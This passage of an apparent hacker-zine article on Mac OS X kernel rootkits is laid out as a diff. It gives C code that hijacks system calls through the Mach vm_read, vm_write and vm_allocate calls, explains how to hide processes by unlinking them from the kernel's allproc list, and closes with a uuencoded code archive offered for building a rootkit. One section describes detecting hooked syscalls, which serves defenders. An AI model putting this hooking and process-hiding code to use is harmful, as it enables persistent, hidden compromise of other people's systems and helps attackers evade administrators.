+Instead of using a rogue kernel module (kext) to hijack syscalls the Mach
+API's can be used for runtime kernel patching. This is nothing new to the
+rootkit community, and has previously been used in rootkits such as SucKIT
+by sd [7] and phalanx by rebel [8], two very impressive rootkits for
+Linux.
+
+To access kernel memory on Linux both SucKIT and phalanx uses /dev/kmem
+(and later /dev/mem). /dev/kmem and /dev/mem has been removed from Mac OS
+X as of version 10.4. The Mach-subsystem does however provide a very
+useful set of memory manipulation functions. The functions of interest for
+a rootkit developer are vm_read(), vm_write() and vm_allocate(). These
+functions allows arbitrary read and write access to the entire kernel from
+userspace as well as allowing allocation of kernel memory. The only
+requirement is root access. 
+
+The vm_allocate() function in particular is of great value. A common
+technique used on other operating systems to allocate kernel memory is to
+replace a system call handler with the kmalloc() function, and then
+execute the syscall. This way an attacker is able to allocate memory in
+kernelspace needed to store the wrapper functions. The big downside of
+this approach is the race condition introduced in case some other userland
+process calls the same syscall. But since the friendly Apple kernel
+developers provided the vm_allocate() function this isn't necessary on Mac
+OS X.
+
+-[ 5.1 - System call hijacking
+
+The vm_read() and vm_write() functions can be used as great tools for
+syscall hijacking. First off the address of the sysentry table needs to be
+located. The process identified by Landon Fuller [1] works just as good
+from userspace as it does from kernelspace. The sysentry table contains
+pointers to all the syscall handler functions we want to hijack.
+
+To read the address to the handler function for a syscall, i.e. SYS_kill,
+we can use the vm_read() function, and passing it the address of the
+sy_call variable of SYS_kill.
+
+mach_port_t port;
+pointer_t buf; /* pointer to your result */
+unsigned int r_addr = (unsigned int)&_sysent[SYS_kill].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_kill_addr = 0; /* final destination */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+   fprintf(stderr, "failed to get port\n");
+   exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &buf, &sz) != KERN_SUCCESS) {
+   fprintf(stderr, "could not read memory\n");
+   exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_kill_addr = *(unsigned int*)buf;
+
+The address to the SYS_kill handler is now available in the sys_kill_addr
+variable. Replacing a syscall handler is as simple as writing a new value
+to the same location using the vm_write() function. In the example below
+we replace the SYS_setuid system call handler with the handler for
+SYS_exit, which will result in the termination of any program that calls
+SYS_setuid.
+
+SYSENT *_sysent = get_sysent_from_mem();
+mach_port_t port;
+pointer_t buf;
+unsigned int r_addr = (unsigned int)&_sysent[SYS_exit].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_exit_addr = 0; /* final destination */
+unsigned int sz, addr;
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+        fprintf(stderr, "failed to get port\n");
+	exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &buf, &sz) != KERN_SUCCESS) {
+        fprintf(stderr, "could not read memory\n");
+	exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_exit_addr = *(unsigned int*)buf;
+
+/* address to system call handler pointer of SYS_setuid */
+addr = (unsigned int)&_sysent[SYS_setuid].sy_call;
+
+/* replace SYS_setuids handler with the handler of SYS_exit */
+if (vm_write(port, (vm_address_t)addr, (vm_address_t)&sys_exit_addr, 
+                      sizeof(sys_exit_addr))) {
+   fprintf(stderr, "could not write memory\n");
+   exit(EXIT_FAILURE);
+}
+
+Now if any program calls setuid(), it will be redirected to the system
+call handler of SYS_exit, and end gracefully. The same thing that can be
+done using a kernel extension can also be accomplished using the Mach API.
+
+In order to actually create a wrapper or completely replace a function
+some kernel memory is needed to store the new code. Below is a simple
+example of how to allocate 4096 bytes of kernel memory using the Mach API.
+
+vm_address_t buf; /* pointer to our newly allocated memory */
+mach_port_t port; /* a mach port is a communication channel between threads */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+   fprintf(stderr, "failed to get port\n");
+   exit(EXIT_FAILURE);
+}
+
+/* allocate memory and return the pointer to &buf */
+if (vm_allocate(port, &buf, 4096, TRUE)) {
+   fprintf(stderr, "could not allocate memory\n");
+   exit(EXIT_FAILURE);
+}
+
+If everything went as planned we now have 4096 bytes of fresh kernel
+memory at our disposal, accessible via buf. This memory can be used as a
+place to store our syscall hooks
+
+-[ 5.2 - Direct Kernel Object Manipulation
+
+It is not just system calls that can be hijacked using this technique, it
+also works just as good to manipulate various other objects in
+kernelspace.  A good example of such a object is the allproc structure,
+which is a list of proc structures of currently running processes on the
+system. This list is used by programs such as ps(1) and top(1) to get
+information about the running processes.
+
+So if you have processes you want to hide from a nosy administrator a nice
+way of doing so is by removing the process proc strcuture from the allproc
+list. This will make the process magically disappear from ps(1), top(1)
+and any other tools that uses the allproc structure as source of
+information.
+
+The allproc struct is, just as the nsysten variable, a exported symbol of
+the kernel. To get the address of the allproc structure in memory you may
+do something like this:
+
+# nm /mach_kernel | grep allproc
+0054280c S _allproc
+#
+
+Now that you have the address of the allproc structure (0x0054280c) all
+you need to do is to modify the list and remove the proc structure of
+the preferred process. As described in "Designing BSD Rootkits" [11] this
+is usually done iterating through the list with the LIST_FOREACH() macro
+and removing entries with the LIST_REMOVE() macro. Since we can't modify
+the memory directly we have to use a wrapper utilizing the vm_read() and
+vm_write() functions, which we also leave as an exercise for the reader
+to implement. :)
+
+--[ 6 - Detection
+
+Detecting kernel rootkits can be very difficult. Some well known rootkits
+leaves traces in the filesystem or open network sockets that can be used
+to identify them. But this is nothing every rootkit does and wont help you
+to spot unknown rootkits. 
+
+Keeping a known good list of the sysentry table and comparing that to the
+current state is another way to try to identify if syscalls have been
+modified. A popular workaround for that is to keep a shadow copy of the
+entire syscall table and modify the interupt-handler to the use the shadow
+table instead of the original one. This will leave the original sysentry
+table intact and anyone looking at it will find it unmodified even though
+all syscalls are still re-routed through the malicious functions. Another
+way is to replace the entire interrupt-handler as well as the sysentry
+table. 
+
+Rootkits that intercept syscalls and modify the contents can sometimes be
+found by the fact that the buffer used to return data has junk at the end.
+Rootkit developers could surely fix this problem, but they often don't.
+Other indications of mischief is that calls that only returns counters,
+for instance the number of running processes, systematically doesn't match
+the count of running processes when listed. 
+
+One way of finding hidden files is to write software that accesses the
+underlying filesystem directly and matches the files on disk with the
+output from the kernel. This requires writing filesystem software or
+finding a library for the specific filesystem used. The upside is that it
+is virtually impossible to intercept and modify calls to the raw device. 
+
+Rootkits that hide open ports can under some circumstances be detected by
+port-scanning, when more advanced rootkits often use port-knocking or
+other types out of band signaling to avoid opening ports. 
+
+Detecting rootkits is a cat and mouse game, and the only winning move is
+not to play. 
+
+-[ 6.1 - Detecting hooked system calls on Mac OS X
+
+Now that you know how to hook system calls, we are going to show you a
+simple, yet effective, way of detecting if your system has gotten any of
+it's system calls hijacked.
+
+We already know that we can get the location of the sysent array in
+memory by adding 32 bytes to the exported nsysent symbol. We also know
+that the nsysent symbol contains the actual number of syscalls available
+on Mac OS X, which is 427 (0x1ab) on 10.5.6.
+
+Now, if we want to check if the current sysent array has been compromised
+we need something to compare it with, something like the original table.
+On Mac OS X the kernel image is a uncompressed, universal (Leopard)
+macho-o binary named mach_kernel found in the root of the filesystem. If
+we take a closer look at the kernel image we get this:
+
+# otool -d /mach_kernel | grep -A 10 "ab 01"
+[...]
+0050a780	ab 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a790	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a7a0	00 00 00 00 94 cf 38 00 00 00 00 00 00 00 00 00 
+0050a7b0	01 00 00 00 00 00 00 00 01 00 00 00 6a 37 37 00
+#
+
+At 0050a780 we see the magic number 427 (0x000001ab), the number of
+available syscalls. If we look 32 bytes ahead we see the value 0x38cf94,
+can this be the start of the sysent array? I think it is!
+
+All we need to is to copy the kernel image to a buffer, find the offset to
+the nsysent symbol, add 32 bytes to the offset and return a pointer to
+that position and we have our original sysent array. All this can be done
+with the following C function.
+
+char *
+get_sysent_from_disk(void)
+{
+	char *p;
+	FILE *fp;
+
+	unsigned long sz;
+	int i;
+
+	fp = fopen("/mach_kernel", "r");
+	if (!fp) {
+		fprintf(stderr, "could not open file\n");
+		exit(-1);
+	}
+
+	fseek(fp, 0, SEEK_END);
+	sz = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	buf = malloc(sz);
+	p = buf;
+
+	fread(buf, sz, 1, fp);
+	fclose(fp);
+
+	for (i = 0; i < sz; i++) {
+		if (*(unsigned int *)(p) == 0x000001ab &&
+			*(unsigned int *)(p + 4) == 0x00000000) {
+			return (p + 32);
+		}
+		p++;
+	}
+
+	return NULL; /* epic fail */
+}
+
+This function can later be used in a simple detector.
+
+struct sysent *_sysent_from_ram;
+struct sysent *_sysent_from_hdd;
+
+_sysent_from_ram = (struct sysent *)get_sysent_from_ram();
+_sysent_from_hdd = (struct sysent *)get_sysent_from_disk();
+
+for (i = 0; i < 428; i++) {
+	if (get_syscall_addr(i, _sysent_from_ram) != get_syscall_addr(i,
+	_sysent_from_hdd))
+		report_hooked_syscall(i);
+}
+
+Of course this method has it's flaws. An attacker may manipulate the
+SYS_open syscall and redirect the call to a rogue copy of the kernel image
+if the file /mach_kernel is accessed. This can be overcome by always
+keeping a fresh and clean copy of the kernel image on a non-writable
+media.
+
+This method is also not capable of detecting inline function hooks in the
+system call handler functions, that's a modification left as an exercise
+for the reader to implement.
+
+--[ 7 - Summary
+
+Rootkits on Mac OS X is not a new topic, but not as well researched as
+i.e. rootkits on Windows or Linux. As we have shown, the techniques used
+is quite similar to the ones used on other unix-like operating systems. In
+addition to this OS X has some extra goodies, like the I/O Kit framework
+and the Mach API, that provides really useful features for people trying
+to subvert the XNU kernel.
+
+Manipulating syscalls, internal kernel structures and other parts of the
+XNU kernel is a great way to hide processes, files and folders and even to
+place backdoors accessible directly from userland. All this can be
+achieved using either a kernel extension or the Mach API, and if done
+right almost impossible to detect. Both techniques have different
+advantages and it's up to you to choose which technique to use in your own
+rootkit.
+
+The purpose of this article was first and foremost to give a basic
+understanding of the subject and is intended as an entry level tutorial
+for anyone wishing to implement their own OS X kernel rootkit and we
+sincerely hope that it helped to shed some light on the subject.
+
+--[ 8 - References
+
+[1] Landon Fuller - Fixing ptrace(pt_deny_attach, ...) on Mac OS X 10.5 Leopard
+     http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_ATTACH.20080122.html
+
+[2] Apple Developer Connection
+     http://developer.apple.com
+
+[3] Apple - Darwin source code
+     http://opensource.apple.com/darwinsource/
+
+[4] Apple Kernel Programming guide
+     http://developer.apple.com/documentation/Darwin/Conceptual/KernelProgramming/keepout/keepout.html
+
+[5] nemo of felinemenace
+     http://felinemenace.org/~nemo/
+
+[6] I/O Kit Device Driver Design Guidelines: Kernel-User Notification
+     http://developer.apple.com/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/KernelUserNotification/KernelUserNotification.html
+
+[7] Linux on-the-fly kernel patching without LKM
+     http://phrack.org/issues.html?issue=58&id=7#article
+
+[8] phalanx rootkit by rebel
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/phalanx-b6.tar.bz2
+
+[9] WeaponX rootkit by nemo
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/wX.tar.gz
+
+[10] logKext keylogger by drspringfield
+      http://code.google.com/p/logkext/
+
+[11] Designing BSD Rootkits by Joseph Kong
+      ISBN 1593271425
+
+--[ 9 - Code
+
+begin 644 code.tar.gz
+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
